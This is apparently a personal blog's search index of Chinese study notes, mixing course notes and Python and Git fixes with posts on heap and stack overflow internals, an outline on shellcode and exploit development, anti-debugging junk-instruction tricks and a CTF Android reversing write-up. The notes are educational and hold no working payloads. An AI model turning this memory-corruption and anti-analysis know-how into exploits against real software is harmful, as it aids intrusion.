<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[形形色色的内存攻击技术]]></title>
    <url>%2F2019%2F09%2F09%2F%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[Assembly Language for X86 Processors]]></title>
    <url>%2F2019%2F09%2F09%2FAssembly-Language-for-X86-Processors%2F</url>
    <content type="text"><![CDATA[Virtual MachineJava编程语言就是以虚拟机概念为基础的，Java编译器把用Java语言编写的程序翻译成Java字节码(Java byte code)。后者是一种低级语言，能够在Java虚拟机JVM上快速执行。 虚拟机概念：一种说明计算机硬件与软件关系的有效办法。虚拟机：一个软件程序，用来模拟一些其他的物理或虚拟计算机的功能。 计算机通常可以执行其用原生机器语言编写的程序，这种语言中的每一条指令都可以直接在相对少量的电子电路中执行，L0语言。 L0极其详细，编写困难–&gt;构造一种较易使用的语言L1. VM1可以执行L1语言编写的指令，VM0可以执行L0语言编写的指令。 每一个虚拟机既可以用硬件构成也可以用软件构成。程序员可以为VM1编写程序，如果能把VM1当作真实计算机加以实现，那么VM1语言就能直接在这个硬件上运行。否则就被翻译/解释为VM0程序 ，并在VM0层次上执行。如果L1对程序员仍然不够友好，则设计一个更加易于理解的VM2和L2. 实际的虚拟机层次结构： Level4-高级语言：翻译成多个汇编语句。 Level3-汇编语言：使用短的助记符，易于转换到ISA层，汇编语言在执行前全部翻译成机器语言。 Level2-指令集架构(ISA，Instruction Set Architecture)：机器语言指令，直接在机器硬件上执行。 Level1-数字逻辑 数据表示计算机总是按8的倍数来组织二进制数字，有必要时在前面加上0. 二进制整数： 计算机以电子电荷集合的形式在内存中保存指令和数据。用数字来表示这些内容就需要系统能够适应开关/真假。位从右向左，从零开始顺序增量编号。左边的称为最高有效位MSB，右边的称为最低有效位LSB。零也被看做正数。书写较大的二进制数时，可以在每4位或每8位加上一个点号，增强数字的可读性。 程序模板1234567891011121314151617181920212223242526；程序模板(Template.asm).386.model flat,stdcall.stack 4096ExitProcess PROTO,dwExitCode:DWORD；检查程序是否执行成功，返回状态码。.data​ ;此处声明变量.codemain PROC​ ;此处编写代码​ INVOKE ExitProcess，0main ENDPEND main .data数据段 .code代码段 .stack堆栈段 常量定义以字母开头的十六进制数必须加个前置0，以防汇编器将其解释为标识符。 字符串常量(string literal)是用单引号或者双引号包含的一个字符 ，包括空格]]></content>
      <tags>
        <tag>school course</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆溢出利用]]></title>
    <url>%2F2019%2F09%2F08%2F%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[堆与栈的区别： 堆是一种在程序运行时动态分配的内存，所谓动态分配是指所需内存大小在程序设计时并不能事先决定，需要在程序运行时参考用户的反馈。 堆在使用时需要程序员使用专门的函数进行申请，如C语言中的malloc函数，是分配内存的函数，堆内存申请有可能成功，也有可能失败，这与申请的内存大小，机器性能和当前运行环境有关。 一般使用一个堆指针来使用申请得到的内存，读写释放都通过这个指针来完成。 使用完毕后需要把堆指针传递给堆释放函数回收这片内存，否则会造成内存泄露，典型的堆释放函数如free，delete。 现代操作系统的堆数据结构一般包括堆块与堆表两类： 堆块：出于性能的考虑，堆区的内存按大小组织成块，以块为单位进行标识，而不是以传统的字节进行标识。一个堆块包括两个部分：块首与块身。块首是一个堆块头部的几个字节，用来标识这个堆块自身的信息，如大小，是否闲置等。块身是紧跟随在块首后的部分，也是最终非陪给用户使用的数据区。 堆表，堆表一般位于堆区的起始位置，用于索引堆区中所有堆块的重要信息，包括堆块的位置，大小，是否被占用等等。（堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块，保证堆分配效率的关键。堆表的设计会采用二叉树等高级数据结构用于优化查找效率。 在Windows中，占用态的堆块被使用它的程序索引，而堆表只索引空闲的堆块。其中最重要的堆表有两种： 空闲双向链表Freelist/快速单向链表Lookaside 空闲双向链表空闲堆块的块首包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块大小不同，空表总共被分为128条(即指针数组中的每个元素包含一条双向链表)。 堆区一开始的堆表区中有一个128项的指针数组，被称为空表索引(Freelist Array),该数组的每一项包含两个指针，用于标识一条空表。 空表索引的第二项free[1]标识了堆中所有大小为16字节的空闲堆块，free[2]标识了堆中所有大小为24字节的空闲堆块，依次类推有：空闲堆块大小=索引项*8(字节)。 把空闲堆块按照大小不同链入不同的链表，可以方便堆管理系统高效检索指定大小的空闲堆块。空表索引的第一项(free[0]所标识的空表)比较特殊，这条双向链表标识了所有大于等于1024字节的堆块。 快速单向链表块表是Windows用来加速堆块分配而采用的一种堆表，块表之所以快，是因为这类单向链表中从来不会发生堆块合并(其中的空闲块块首被设置为占用态，以防止堆块合并)。 快表也有128条，组织结构与空表类似，但是其中的堆块按照单链表组织。块表总是被初始化为空，并且每条快表最多有四个节点，所以很快就会被填满。 堆块分配/堆块释放/堆块合并（Coaleace)分配与释放是在程序提交与执行的，合并是由堆管理系统自动完成的。 堆块分配堆块分配可以分成三类：块表分配，普通空表分配和零号空表分配。 快表分配比较简单，包括寻找到大小匹配的空闲堆块(只有精准匹配时才会使用快表分配，故不存在对块的分割操作)，将其状态修改为占用态，将它从堆表中卸下，最后返回一个指向堆块块身的指针给程序使用。 普通空表分配时，首先寻找最优的空闲块进行分配，再寻找次优的空闲块进行分配，一直寻找到最小能够满足要求的空闲块。？？？？最优到底指的是以什么为标准。 零号空表中，按照大小升序链接大小不同的空闲块，故在分配内存的时候会反向查找最后一个(即链表中最大的一个堆块)，看能否满足要求。如果满足要求，则确定能够成功分配。再从第一个堆块开始从小到大正向搜索最小能够满足条件的堆块(零号空表升序排列的原因)。 当无法找到匹配的最优堆块时(大小完全精准符合)，一个稍大一些的堆会用于分配。这种次优分配发生时，会先从大块中按照请求的大小精准地割出一块进行分配，然后剩下的部分重新分配块首，链入空表，再次可以被索引到。 此处没有考虑堆缓存(heap cache)，低碎片堆(LFH)与虚分配。 堆块释放堆块释放的操作包括将堆块状态改为空闲，链入相应的堆表。所有释放块都链入堆表的末尾，分配的时候也从堆表末尾拿。特殊强调：快表最多有4项。 堆块合并经过反复的申请与释放操作，内存中的堆区可能会产生很多内存碎片。为了合理有效地利用内存，堆系统还能够进行堆块合并操作：当堆管理系统发现两个堆块相邻的时候，就会进行堆块合并操作。 堆块合并包括将两个块从空闲链表中卸下，合并堆块，调整合并后大块的块首信息，将新块重新链入空闲链表。]]></content>
      <tags>
        <tag>0day安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Metasploit开发Exploit]]></title>
    <url>%2F2019%2F09%2F08%2F%E7%94%A8Metasploit%E5%BC%80%E5%8F%91Exploit%2F</url>
    <content type="text"></content>
      <tags>
        <tag>0day安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开发shellcode的艺术]]></title>
    <url>%2F2019%2F09%2F08%2F%E5%BC%80%E5%8F%91shellcode%E7%9A%84%E8%89%BA%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[Shellcode:缓冲区溢出攻击中植入进程的代码 Exploit:计算函数返回地址距离缓冲区的偏移并覆盖，选择指令的地址，最终制作出一个由攻击效果，承载着shellcode的输入字符串位Exploit。 exploit一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他输入，其核心是淹没返回地址，劫持进程的控制权，之后跳转去执行shellcode。与shellcode一定的通用性不同，exploit一般是针对特定漏洞的。 Metasploit通用漏洞测试平台：规范化exploit和shellcode之间的接口，把漏洞利用的过程封装成易用的模块，实现了代码重复利用和模块化，结构化的思想。在这个平台中： 所有的exploit都使用漏洞名称来命名，里面包含有这个漏洞的函数返回地址，所使用的跳转指令等关键信息。 将常用的shellcode(例如用于绑定端口反向连接，执行任意命令)封装成一个个通用的模块，与任意漏洞的Exploit进行组合。 今天电脑不是一般地卡，第二章该调试的操作都还没练习过，这对于学习来说是非常危险的，第三章shellcode开发也得静下心研究。 0X00:定位shellcode 栈帧移位与jmp esp 获取跳板地址 使用跳板定位exploit 0X01:缓冲区的组织 缓冲区的组成 抬高栈顶保护shellcode 使用其他跳转指令 不使用跳转指令 函数返回地址移位 0X02:开发通用的shellcode 定位API的原理 shellcode的加载与调试 动态定位API地址的shellcode 0X03：shellcode编码技术 为什么要对shellcode编码 会变形的shellcode 0X04:简化shellcode]]></content>
      <tags>
        <tag>0day安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机中数的存储]]></title>
    <url>%2F2019%2F09%2F08%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E6%95%B0%E7%9A%84%E5%AD%98%E5%82%A8%2F</url>
    <content type="text"><![CDATA[一直对计算机中数的存储方式一知半解，make a summary today。 source：为什么-1在计算机中的存储是0XFFFFFFFF? 负整数用补码(Two’s-complement)表示的数学原理是:一个整数的补码是其加法逆元（如果将一个数与其加法逆元相加，其结果为0）。 0X00:原码，反码，补码原码表示法规定：用符号位和数值位两部分表示一个带符号数，设字长为n位，最高位为符号位，正数的符号位用0表示，负数的符号位用1表示。其余n-1位数值部分用二进制形式表示。在原码中，零有两种表示形式，00000000为+0，10000000为-0. 原码所能表示的数的范围与二进制的位数(即机器字长)有关，由8位二进制数表示到由16位二进制数表示，能够表示的范围会增大。 反码表示法规定：正数的反码与原码相同，负数的反码是对该数的原码除符号位外各位取反。 补码表示法规定：正数的补码与原码相同，负数的补码是对该数的原码除符号位外各位取反后最末位+1.十六进制数的补码，就是将一个十六进制整数按位取反并+1.简单的方法就是用15减去该数字，最后再+1. 零的补码是唯一的：00000000 补码所能表示的数的范围与二进制的位数(即机器字长)有关，由8位二进制数表示到由16位二进制数表示，能够表示的范围会增大。 任何一个数的补码的补码即是其原码本身。 几种进制（有符号/无符号之间的转换）有符号二进制整数到十进制的转换如果最高位是1，则该数是补码，再次对其求补，得到其正数值。然后把这个数看成一个无符号二进制数，并求它的十进制值。 如果最高位是0，就将其视为无符号二进制整数，并转换为十进制数。 （先辨别了是否是负数） 有符号十进制数到二进制的转换把十进制整数的绝对值转换成二进制数 如果初始十进制数是负数，则在第一步的基础上求其补码。 （先把二进制数表示出来（与数字无关），再判断是否是负数） 有符号十进制数到十六进制的转换把十进制整数的绝对值转换成十六进制数 如果初始十进制数是负数，则在第一步的基础上求其补码。 有符号十六进制数到十进制的转换如果十六进制整数是负数，求其补码，否则保持不变。 把第一步得到的数转换成十进制。如果初始值是负数，则在十进制数前面加上负号。 通过检查十六进制数的最高有效位，就可以知道该十六进制数是正数还是负数。如果最高位&gt;=8,则该数是负数。如果最高位&lt;=7，则该数是正数。 普遍规律：根据符号是否对数字产生影响，若产生影响(负数十六进制/二进制），求其补码。进制转换后再根据初始正负加符号。若不产生影响，（正数十六进制/二进制，任意十进制），直接进制转换，再看初始正负。]]></content>
      <tags>
        <tag>底层</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库原理及其应用课程笔记]]></title>
    <url>%2F2019%2F09%2F06%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1.3数据模型 对事物描述的符号记录称为数据。 实体(Entity):实体是具有相同性质并且彼此之间可以相互区分的现实世界对象集合。 在关系数据库中，一个实体被映射成一个关系表，表中一行对应一个现实世界对象（组成实体的对象）即Entity Instance。 属性（Arttribute）是实体所具有的特征，是描述实体或关系的性质的数据项。 关系（Relationship）实体之间的关系和实体内部的关系，实体内部的关系比较固定且较少使用。]]></content>
      <tags>
        <tag>school course</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基础知识&栈溢出原理与实践]]></title>
    <url>%2F2019%2F09%2F05%2F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%26%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[0X00:基础知识PE文件概述：PE是Win32平台下的可执行文件遵守的数据格式，常见可执行文件如.exe/.dll都属于PE文件，PE文件格式规定了二进制的机器代码和字符串，菜单，图标等其他信息在可执行文件中如何组织。程序被执行时，系统会按照PE文件格式的约定去准确地定位各种资源，并将其加载入内存的不同区域。 PE文件格式把可执行文件分割成多个数据节(section) .text，由编译器产生，存放着编译产生的二进制机器代码，反汇编和调试的对象。 .data,初始化的数据块，宏定义，全局变量，静态变量。 .idata,所执行的动态链接库等外来函数与文件的信息。 .rsrc,存放程序的资源，如图标，菜单等。 虚拟内存：Windows的物理内存比较复杂，Windows内核Ring0级别才能看到。通常在用户模式下，用调试器看到的内存都是虚拟内存。每个进程都被分配了4GB的内存空间，实际上能够用到的内存空间没有那么多。内存管理器分配给了进程一片假地址/虚拟地址，只有当需要进行实际的内存操作时，内存管理器才会把虚拟地址与物理地址联系起来。 一个512MB的虚拟内存，能够映射出几个进程4GB的虚拟内存，关键在于这几个进程实际用到的内存之和小于512MB. PE文件与虚拟内存之间的映射：1.静态反汇编工具显示的某条文件的指令是相对于磁盘文件而言的，即文件偏移。我们还可能想知道虚拟内存地址VA。 2.动态调试时看到的某条指令是虚拟内存地址，经常需要回到PE文件找到这条指令的机器码。 四个概念：注意是在内存中还是在PE文件中 1.文件偏移地址(File Offset)静态 数据在PE文件中的地址叫做文件偏移地址，是文件在磁盘上存放时，相对于文件开头的偏移。 2.装载基址(Image Base)动态 PE装入内存中时的基地址，默认情况下装载基址为0X00400000，DLL文件的装载基址是0X10000000. 3.虚拟内存地址(Virtual Address)动态 PE文件中的指令被装入内存之后的地址。 4.相对虚拟地址(Relative Virtual Adress)动态 相对虚拟地址是内存地址相对于映射基址的偏移量。 所以有VA=Image Base+RVA 默认情况下将PE文件的0字节映射到虚拟内存的0x00400000，这个地址就是装载基址。 文件偏移是相对于文件开始处0字节的偏移，RVA是相对于装载基址0x00400000的偏移。 操作系统在装载PE文件时基本上保持PE文件中的各种数据结构，所以文件偏移地址和RVA相对虚拟地址有很大的一致性。不完全一致是因为文件数据的存放单位和内存数据的存放单位不同。 PE文件中的数据在未装载入内存之前，按照磁盘数据存放，以0X200字节为单位。当一个数据节(section)不足0X200时，不足的部分将被0X00填充。所以PE数据节的大小永远是0X200的整数倍。 PE文件中的数据被装载入内存之后，按照内存数据的标准以0X1000为单位进行存放，所以内存中的数据节大小永远是0X1000的整数倍。 由于数据在PE文件和内存中的存储单位不同，所以文件偏移和RVA只是”有很大的一致性”。由于上述差异，进行文件偏移到虚拟内存地址之间的转换要看所转换的地址属于第几个节内(在数据节的前面还是后面)。 文件偏移地址=虚拟内存地址VA-装载基址(Image Base)-节偏移=RVA-节偏移。 0X01:栈溢出原理与实战内存四区(注意是内存不是PE文件)： 代码区：存储被装入执行的二进制机器代码，CPU从这个区域取指令执行。 数据区：存储全局变量等。 堆区：进程在堆区动态地请求一定大小的内存，并在用完之后free。动态地分配和回收是堆区的特点。 栈区：用于动态地存储函数之间的调用关系。 系统栈是对内存中所有栈的统称，栈帧是指一个函数开辟出的栈空间。严格来说，栈帧底部和栈底部不是同一概念。所以在对EBP进行说明时：它指向当前位于系统栈最上边一个栈帧的底部，而不是系统栈的底部。ESP所指的栈帧底部与系统栈底部是同一位置。 在函数栈帧中，包含： 局部变量：为函数局部变量开辟的内存空间。 栈帧状态值：保存前栈帧的顶部和底部(实际上只保存底部，前栈帧的顶部可以通过堆栈平衡计算得到？。)，用于在本栈帧被弹出后恢复上一个栈帧。 函数返回地址：保存当前函数调用前的EIP信息(不准确？)就是函数调用前的指令位置，即函数调用前的指令位置，这样函数返回时能够恢复到函数被调用前的代码区中继续执行指令。 函数的栈帧大小并不确定，与其对应的局部变量的多少有关。在调试过程中也能发现，在函数运行的过程中，其栈帧大小也在不断变化。 函数调用的过程包含以下几个步骤： 参数入栈：将参数从右向左依次压入系统栈中。 返回地址入栈：将当前代码区调用指令的下一条指令压入栈中，待函数返回时pop出返回地址为EIP指向继续执行。 代码区跳转：处理器从当前代码区跳转到被调用函数的入口处。 栈帧调整： PUSH EBP(保存当前栈帧状态值，备后面回复本栈帧时使用) MOV EBP,ESP(将当前栈帧切换到新栈帧，更新栈帧底部) SUB ESP,XXX(给新栈帧分配空间,抬高栈顶) 函数的返回过程包含如下几个步骤： 保存返回值：通常将函数的返回值保存在寄存器EAX中 弹出当前栈帧，恢复上一个栈帧，具体如下： 在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前的栈空间。 将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复上一个栈帧。 将函数返回地址弹给EIP寄存器。 4.最后一步——跳转：按照函数返回地址跳回母函数中继续执行。 注意CALL指令和RETN指令的实际操作 我的误区： 返回地址和EBP并不是同一概念与功能。CALL指令之后，先将返回地址压入栈中再PUSH EBP(旧栈帧，功能在于初始化，后面的MOV指令对其中的值进行更新)，EBP对函数返回并无任何贡献。 MOV EBP,ESP指令并不会对已经存放在栈中的EBP的值进行改变，是对寄存器EBP的值进行改变。注意当前栈帧保存的EBP值永远是前栈帧的EBP。 关于栈帧的划分，在不同书中有不同的约定。本书中坚持栈帧底部存放前栈帧EBP,栈帧顶部存放返回地址。 在观察内存的时候应该注意”内存数据”与”数值数据”的区别。在调试环境中，内存由低到高分布，就像Win32系统在内存中由低位向高位存储一个四字节的双字(Dump窗口的十六进制两位)，但是在作为”数值数据”应用的时候，是由高位字节向低位字节进行解释的。所以在调试环境中，内存数据中的双字与我们通常使用的数值数据是以双字为单位逆序过的。出于阅读方便，OD已经自动在栈中进行了反转，在栈窗口所看到的数据是数值数据而非内存数据。所以在栈内看数据时，从左向右对于左边的地址偏移依次为3，2，1，0.]]></content>
      <tags>
        <tag>0day安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git的大小写问题]]></title>
    <url>%2F2019%2F09%2F05%2FGit%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%86%99%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[使用 Hexo 部署博客到 Github Pages 时经常会遇到文件夹大小写问题导致的 404问题，如tag标签无法访问返回404。 原因 git 默认忽略文件名大小写，所以即使文件夹大小写变更，git 也检测不到。 解决办法 进入到博客项目中 .deploy_git文件夹，修改 .git 下的 config 文件，将 ignorecase=true 改为 ignorecase=false。]]></content>
      <tags>
        <tag>报错</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Android逆向入门]]></title>
    <url>%2F2019%2F08%2F31%2FAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[关于Android逆向解题过程的总结 0X00:功能测试首先将APK文件拖入模拟器中，测试其功能，根据弹出的字符串，寻找解题的突破口。 0X01:主活动首先通过Androidmanifest.xml的找到Mainactivity，再对其中的代码进行逆向分析。 0X02:特殊情况隐藏mainactivity 0X03:几种工具的优势能够显示出被调用过的函数 0X04:具体题目攻防世界APP1： 首先用jadx打开，寻找到其中的Androidmanifest.xml，通过intent-filter找到主活动。 对Java代码进行分析 找到关键代码 通过Buildconfig找可能有用的信息，如该题中的versionName和versionCode，分别为X&lt;cP[?PHNB&lt;P?aj和15. charAt(i)函数，输出字符串中的第i个数字。可知这句代码的意思是：将输入字符串的第1~i个字符分别和versionCode与versionName异或之后的结果进行相等比较。如果不相等的话，输出”再接再厉，加油！” 于是Python脚本如下： s=”X&lt;cP[?PHNB&lt;P?aj” flag=” “ for i in s: ​ flag+=chr(ord(i)^15)//将s中的字符逐个转化为数字，与15进行异或后，再以字符形式输出。 ​ print(flag) 攻防世界App2： 观察程序功能 jadx打开 由第一个活动传到了第二个活动,观察到： 进入这个class 可见是native层的调用 于是改apk后缀为zip对.so进行分析，找到其中的lib，任意对其中一项分析。 可见是AES thisisateatkey== 作为密钥解密得：]]></content>
  </entry>
  <entry>
    <title><![CDATA[Brisk]]></title>
    <url>%2F2019%2F08%2F21%2FBrisk%2F</url>
    <content type="text"><![CDATA[Welcome to my blog, enter password to read this private essay. Decrypt U2FsdGVkX1/JLDCs0uRYTpGveQTiV8Bpp1HF3UE3Yf/vCh82UMl7rPc09jmtFJsZ7EDlHeT4Z84tAbT5ks0c0TYlpQAB0DG9jfCMMbzfdamuH3w+4nBXFwr8KxpaL7/ZOsED+2WHK0jW02jwlVS42qnAhwCLKo/xCbde2wIGT7KJAoizn7d+aReerGJGjcbvYlU6Tz7zURMdHEXX1kJzJdnqjVYyGhcHNx2bXM3p5nPNYkMBHItFGk42NIp2aynX]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux ELF]]></title>
    <url>%2F2019%2F08%2F21%2FLinux-ELF%2F</url>
    <content type="text"><![CDATA[Linux 可执行文件格式 ELF （Executable Linkable Format）文件的三种类型： 可重定位文件（Relocatable file） 包含了代码和数据，可以和其他目标文件链接生成一个可执行文件或共享目标文件。 elfDemo.o 可执行文件（Executable File） 包含了可以直接执行的文件。 elfDemo_static.out 共享目标文件（Shared Object File） 包含了用于链接的代码和数据，分两种情况。一种是链接器将其与其他的可重定位文件和共享目标文件链接起来，生产新的目标文件。另一种是动态链接器将多个共享目标文件与可执行文件结合，作为进程映像的一部分。 elfDemo.out libc-2.25.so 可以看到，在这个简化的 ELF 文件中，开头是一个“文件头”，之后分别是代码段、数据段和.bss段。程序源代码编译后，执行语句变成机器指令，保存在.text段；已初始化的全局变量和局部静态变量都保存在.data段；未初始化的全局变量和局部静态变量则放在.bss段。 把程序指令和程序数据分开存放有许多好处，从安全的角度讲，当程序被加载后，数据和指令分别被映射到两个虚拟区域。由于数据区域对于进程来说是可读写的，而指令区域对于进程来说是只读的，所以这两个虚存区域的权限可以被分别设置成可读写和只读，可以防止程序的指令被改写和利用。 ELF 文件结构 ELF 文件头（ELF Header） 在目标文件格式的最前面，包含了描述整个文件的基本属性。 程序头表（Program Header Table） 是可选的，它告诉系统怎样创建一个进程映像。可执行文件必须有程序头表，而重定位文件不需要。 段（Section） 包含了链接视图中大量的目标文件信息。 段表（Section Header Table） 包含了描述文件中所有段的信息。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反静态调试]]></title>
    <url>%2F2019%2F07%2F21%2F%E5%8F%8D%E9%9D%99%E6%80%81%E8%B0%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[反调试：插入代码，让程序意识到自己在被调试时，执行代码阻止调试器的分析，延长调试的时间。通过改变正常的执行路径或者修改自身程序让自己崩溃，从而增加调试的时间和复杂度。 0X00:IDA中的反反调试F5之后IDA报错，红色显示：”sp-analysis failed”(IDA有栈跟踪的功能，它在函数内部遇到ret(retn)指令时会做判断：栈指针的值在函数的开头/结尾是否一致，如果不一致就会在函数的结尾标注”sp-analysis failed”。),说明栈指针未平衡。通过”Options-General-Disassembly-“Stack pointer”显示出栈指针。之后Alt+K进行修改，将Call之前的栈指针减去0X04就得到正确的数值。 0X01:花指令插入花指令或者垃圾代码可以保护自己的代码 asm的作用：用于调用内联汇编程序，并且可在 C 或 C++ 语句合法时出现， asm后跟一个程序集指令、一组括在大括号中的指令或者至少一对空大括号。emit指令的作用： 编译器不认识的指令，拆成机器码来写。 插入垃圾字节来反跟踪，又称花指令。 __ams { ​ lea eax,lab1; ​ jmp eax; ​ _emit 0x90; } lab1: ​ printf(“func1\n”); 0X02：某些函数在使用 f5 进行反编译时，会提示错误 “sp-analysis failed”，导致无法正确反编译。原因可能是在代码执行中的 pop、push 操作不匹配，导致解析的时候 esp 发生错误。 解决办法步骤如下： 用 Option-&gt;General-&gt;Disassembly, 将选项 Stack pointer 打钩 仔细观察每条 call sub_xxxxxx 前后的堆栈指针是否平衡 有时还要看被调用的 sub_xxxxxx 内部的堆栈情况，主要是看入栈的参数与 ret xx 是否匹配 注意观察 jmp 指令前后的堆栈是否有变化 有时用 Edit-&gt;Functions-&gt;Edit function…,然后点击 OK 刷一下函数定义]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python's error]]></title>
    <url>%2F2019%2F07%2F18%2FPython-s-error%2F</url>
    <content type="text"><![CDATA[报错1:Exception:Traceback (most recent call last): File “/usr/lib/python2.7/dist-packages/pip/basecommand.py”, line 209, in main status = self.run(options, args) File “/usr/lib/python2.7/dist-packages/pip/commands/install.py”, line 328, in run wb.build(autobuilding=True) File “/usr/lib/python2.7/dist-packages/pip/wheel.py”, line 748, in build self.requirement_set.prepare_files(self.finder) File “/usr/lib/python2.7/dist-packages/pip/req/req_set.py”, line 360, in prepare_files ignore_dependencies=self.ignore_dependencies)) File “/usr/lib/python2.7/dist-packages/pip/req/req_set.py”, line 512, in _prepare_file finder, self.upgrade, require_hashes) File “/usr/lib/python2.7/dist-packages/pip/req/req_install.py”, line 273, in populate_link self.link = finder.find_requirement(self, upgrade) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 442, in find_requirement all_candidates = self.find_all_candidates(req.name) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 400, in find_all_candidates for page in self._get_pages(url_locations, project_name): File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 545, in _get_pages page = self._get_page(location) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 648, in _get_page return HTMLPage.get_page(link, session=self.session) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 757, in get_page “Cache-Control”: “max-age=600”, File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.py”, line 480, in get return self.request(‘GET’, url, *kwargs) File “/usr/lib/python2.7/dist-packages/pip/download.py”, line 378, in request return super(PipSession, self).request(method, url, *args, *kwargs) File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.py”, line 468, in request resp = self.send(prep, *send_kwargs) File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.py”, line 576, in send r = adapter.send(request, *kwargs) File “/usr/share/python-wheels/CacheControl-0.11.5-py2.py3-none-any.whl/cachecontrol/adapter.py”, line 46, in send resp = super(CacheControlAdapter, self).send(request, **kw) File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/adapters.py”, line 376, in send timeout=timeout File “/usr/share/python-wheels/urllib3-1.13.1-py2.py3-none-any.whl/urllib3/connectionpool.py”, line 610, in urlopen _stacktrace=sys.exc_info()[2]) File “/usr/share/python-wheels/urllib3-1.13.1-py2.py3-none-any.whl/urllib3/util/retry.py”, line 228, in increment total -= 1TypeError: unsupported operand type(s) for -=: ‘Retry’ and ‘int’ 解决办法:(主要是pip的版本问题引起的) easy_install pip pip install –upgrade pip (此处执行原本要进行的命令) 报错2:AttributeError: ‘module’ object has no attribute ‘b64encode’ import base64出现的报错 原因：.pyc文件出现的问题 解决办法：将base64.py重命名，并删除pyc文件。 Python运行时，会先查找该程序所在路径，是否有相关的模块，有则直接引用。正好该目录下有一个base64.py文件，而这个文件非官方的base64库。 1.什么是pyc文件？ pyc文件是python编译后的字节码文件。Python的程序中，是把原始程序代码放在.py文件里，而Python会在执行.py文件的时候。将.py形式的程序编译成中间式文件（byte-compiled）的.pyc文件，这么做的目的就是为了加快下次执行文件的速度。 2.Python运行过程 Python是一种解释型语言，每次执行都需要进行一次翻译。执行 python *.py 后，将会启动 Python 的解释器，将 *.py 编译成一个字节码对象 PyCodeObject，存放在内存，当这个模块的 Python 代码执行完之后就会将编译结果保存到 *.pyc文件中，下一次就不需要编译，直接加载到内存中。 a.模块在被导入时会先检查本地目录下是否有pyc文件 b.若有pyc文件，对比py文件的修改时间是否一致，若一致，直接使用pyc文件，若不一致，对py文件进行解释，并将结果覆盖本地的pyc文件 c.若未找到pyc文件，对py文件进行解释，并将结果回写到本地的pyc文件中 重名出现的问题 报错4:python前注释12#!/usr/bin/env python# -*- coding:utf-8 -*- 报错5：IndentationError: unexpected indent 此处有一个意料之外的缩进 IndentationError:expected an indented block 此处需要一个缩进 注意空格与Tab不能混用 报错6：SyntaxError: unexpected EOF while parsing 未验证函数参数是否有效，传入了空的参数。]]></content>
      <tags>
        <tag>error</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[One Piece]]></title>
    <url>%2F2019%2F07%2F18%2FOne-Piece%2F</url>
    <content type="text"><![CDATA[我们当然还会想到过去几十年老科学家如何牺牲自我的故事。但说实话，过去四十年来的老科学家们的生活绝对在社会平均水平之上，他们有单位分配的房子，有各种保障，没有几个是吃不饱饭的，他们得到了充分的尊重与报酬。科学家拿钱搞科研，做好自己的本分工作就可以了，不额外承担感动国人的责任。 如果你现在是上大学的话，建议你至少修两个专业，计算机科学一定要学，另外是脑神经科学。对于将来新一代的计算体系而言，如果我们对人的大脑理解更深，会有更大的突破。如果你还有时间，我会建议你修经济学，如何琢磨出人与人之间的结构化的关系、社会关系，经济学是相当不错的学科。如果你还有时间，建议你学心理学，因为我们对个人的认知，目前来讲还相当浅，希望能够有更多机会加深对人的了解。 最后，我比较推荐作者而不是推荐书。第一个作者叫大卫·克里斯蒂安，他所写的一本书叫《大历史》，研究人类历史和研究自然历史是分不开的，起点必须要从大爆炸开始，看物理生态、化学生态、生物生态，在这个基础上再来看人类社会。 另外我会推荐是杰弗里·摩尔，他的书在商业生态上比较行之有效，他写过几本书，一本叫《跨越鸿沟》，一本叫《逃离速度》。 我还会推荐弗雷德·考夫曼（Fred Kofman），他曾经是我的导师，我推荐两本书，一本书叫《有良知的商业》（《Conscious Business》 